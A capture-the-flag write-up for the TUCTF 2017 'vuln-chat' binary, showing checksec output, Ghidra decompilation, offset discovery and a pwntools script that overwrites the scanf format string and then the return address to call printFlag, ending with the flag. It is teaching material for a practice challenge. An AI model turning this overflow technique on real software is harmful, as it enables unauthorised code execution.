# Vuln-chat - nightmare

check file info
```console
matan@matan:~/Documents/hacking/nightmare/stackoverflow/tuctf_2017_vulnchat$ file vuln-chat 
vuln-chat: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=a3caa1805eeeee1454ee76287be398b12b5fa2b7, not stripped
matan@matan:~/Documents/hacking/nightmare/stackoverflow/tuctf_2017_vulnchat$ checksec --file=vuln-chat
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH	Symbols		FORTIFY	Fortified	Fortifiable	FILE
No RELRO        No canary found   NX enabled    No PIE          No RPATH   No RUNPATH   75) Symbols	  No	0		1		vuln-chat
```
we can see that the exe is type of 32bit.
lets reverse it Ghidra:
```c

undefined4 main(void)

{
  undefined local_31 [20];
  undefined local_1d [20];
  undefined4 local_9;
  undefined local_5;
  
  setvbuf(stdout,(char *)0x0,2,0x14);
  puts("----------- Welcome to vuln-chat -------------");
  printf("Enter your username: ");
  local_9 = 0x73303325;
  local_5 = 0;
  __isoc99_scanf(&local_9,local_1d);
  printf("Welcome %s!\n",local_1d);
  puts("Connecting to \'djinn\'");
  sleep(1);
  puts("--- \'djinn\' has joined your chat ---");
  puts("djinn: I have the information. But how do I know I can trust you?");
  printf("%s: ",local_1d);
  __isoc99_scanf(&local_9,local_31);
  puts("djinn: Sorry. That\'s not good enough");
  fflush(stdout);
  return 0;
}
```
we can see that we we have 2 buffer that we can overflow them.
1. local_31 [20] -> `__isoc99_scanf(&local_9,local_1d);`
2. local_1d [20] -> `__isoc99_scanf(&local_9,local_31);`

local9 is format for scanf ,lets check it's value 0x73303325 -> "%30s" so our buffer limited to 30 chars
we can override local_9 in order to override rip in `__isoc99_scanf(&local_9,local_31);`
first buffer should be 20 bytes + '%100s'
second buffer - we can check it with pattern_create
```
matan@matan:~/Documents/hacking/nightmare/stackoverflow/tuctf_2017_vulnchat$ /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 60
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9

matan@matan:~/Documents/hacking/nightmare/stackoverflow/tuctf_2017_vulnchat$ /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -l 60 -q b6Ab
[*] Exact match at offset 49
```

in order to print the flag i found function printFlag ,we can override the eip to printFlag address.
```
pwndbg> p printFlag
$6 = {<text variable, no debug info>} 0x804856b <printFlag>
```

lets write the exploit
```python
from pwn import process, packing


def exploit():
    format_buffer = b'A' * 20 + b'%100s'
    override_eip_payload = b'A' * 49 + packing.p32(0x804856b)
    prs = process("./vuln-chat")
    prs.sendline(format_buffer)
    prs.sendline(override_eip_payload)
    prs.interactive()


if __name__ == '__main__':
    exploit()

```

Result:
```console
matan@matan:~python /home/matan/Documents/hde65/web_requests/nightmare/vulnchat.py
[+] Starting local process '/home/matan/Documents/hacking/nightmare/stackoverflow/tuctf_2017_vulnchat/vuln-chat': pid 56878
[*] Switching to interactive mode
----------- Welcome to vuln-chat -------------
Enter your username: Welcome AAAAAAAAAAAAAAAAAAAA%100s!
Connecting to 'djinn'
--- 'djinn' has joined your chat ---
djinn: I have the information. But how do I know I can trust you?
AAAAAAAAAAAAAAAAAAAA%100s: djinn: Sorry. That's not good enough
flag{g0ttem_b0yz}
Use it wisely

```

